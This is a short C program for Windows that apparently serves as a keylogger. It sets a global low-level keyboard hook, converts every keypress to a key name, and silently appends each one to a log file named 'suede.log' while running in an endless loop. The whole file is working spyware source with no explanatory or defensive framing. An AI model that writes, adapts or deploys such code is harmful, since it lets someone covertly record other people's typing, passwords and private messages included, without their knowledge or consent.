#include <stdio.h>
#include <windows.h>
HHOOK hKeyHook;

LRESULT KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
  KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
  DWORD mesg = 1;
  switch (wParam) {
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
      mesg += hooked->scanCode << 16;
      mesg += hooked->flags << 24;
      char kn[] = "Windows Right";
      GetKeyNameText(mesg, kn, sizeof kn);
      FILE * fpt = fopen("suede.log", "a");
      fprintf(fpt, "_%s", kn);
      fflush(fpt);
  }
  return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, 0, 0);
  while (1) {
    GetMessage(0, 0, 0, 0);
  }
}
